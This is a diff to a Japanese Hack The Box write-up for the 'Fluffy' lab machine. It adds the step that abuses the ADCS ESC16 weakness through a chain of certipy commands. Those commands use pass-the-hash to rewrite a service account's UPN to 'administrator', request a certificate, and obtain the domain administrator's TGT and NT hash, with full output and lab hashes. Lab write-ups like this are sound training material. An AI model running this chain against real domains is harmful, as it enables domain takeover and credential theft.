@@ -339,6 +339,7 @@ a599d11e8afd3ae88a721964b11b7671
 
 
 ## STEP 4
+ca_svcは興味深いグループ「cert publisher」に所属している  
 step3で侵害したwinrm_svcが所属するservice accountsグループはca_svcに対するgenericwrite権限を有していた  
 ということで、step3と同じ攻撃手法でshadowcredentialsを追加できるね  
 <img src="https://github.com/mylovemyon/hackthebox_images/blob/main/Fluffy_03.png">  
@@ -372,7 +373,7 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 脆弱性を調査すると、esc16を確認  
 esc16は拡張機能の無効の結果、upnが偽造することができユーザのなりすましが可能になる
 ```sh
-─$ certipy-ad find -stdout -target 10.129.250.233 -enabled -vulnerable -u ca_svc -hashes ca0f4f9e9eb8a092addf53bb03fc98c8        
+─$ certipy-ad find -stdout -target 10.129.250.233 -enabled -vulnerable -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8        
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Finding certificate templates
@@ -426,4 +427,66 @@ Certificate Authorities
       ESC16                             : Other prerequisites may be required for this to be exploitable. See the wiki for more details.
 Certificate Templates                   : [!] Could not find any certificate templates
 ```
-upnの変更はwrite権限が必要であるため、ca_svcユーザ権限で
+ここでpfxを使用できるのはEnrollに登録されている「cert publisher」なのでca_svcを使用してpfxを取得する必要がある  
+またupnの変更はwrite権限が必要であり、step3およびstep4でwinrm_svcの所属先であるserviceaccountsグループはca_svcユーザに対してgenericwrite権限を有していることを確認した  
+ということでwinrm_svcユーザ権限でca_svcのupnを変更する
+```sh
+└─$ certipy-ad account -user ca_svc -upn administrator -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : administrator
+[*] Successfully updated 'ca_svc'
+
+└─$ certipy-ad account -user ca_svc -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 read 
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Reading attributes for 'ca_svc':
+    cn                                  : certificate authority service
+    distinguishedName                   : CN=certificate authority service,CN=Users,DC=fluffy,DC=htb
+    name                                : certificate authority service
+    objectSid                           : S-1-5-21-497550768-2797716248-2627064577-1103
+    sAMAccountName                      : ca_svc
+    servicePrincipalName                : ADCS/ca.fluffy.htb
+    userPrincipalName                   : administrator
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-04-17T16:07:50+00:00
+    whenChanged                         : 2025-10-27T21:01:15+00:00
+```
+```sh
+└─$ certipy-ad req -ca fluffy-DC01-CA  -template User -target-ip 10.129.250.233 -u ca_svc@fluffy.htb -hashes ca0f4f9e9eb8a092addf53bb03fc98c8
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] DNS resolution failed: The DNS query name does not exist: FLUFFY.HTB.
+[!] Use -debug to print a stacktrace
+[*] Requesting certificate via RPC
+[*] Request ID is 22
+[*] Successfully requested certificate
+[*] Got certificate with UPN 'administrator'
+[*] Certificate has no object SID
+[*] Try using -sid to set the object SID or see the wiki for more details
+[*] Saving certificate and private key to 'administrator.pfx'
+[*] Wrote certificate and private key to 'administrator.pfx'
+```
+```sh
+└─$ certipy-ad account -user ca_svc -upn ca_svc@fluffy.htb -dc-ip 10.129.250.233 -u winrm_svc@fluffy.htb -hashes 33bd09dcd697600edf6b3a7af4875767 update
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Updating user 'ca_svc':
+    userPrincipalName                   : ca_svc@fluffy.htb
+[*] Successfully updated 'ca_svc'
+```
+```sh
+└─$ certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.250.233 -domain fluffy.htb
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: 'administrator'
+[*] Using principal: 'administrator@fluffy.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'administrator.ccache'
+[*] Wrote credential cache to 'administrator.ccache'
+[*] Trying to retrieve NT hash for 'administrator'
+[*] Got hash for 'administrator@fluffy.htb': aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e
+```
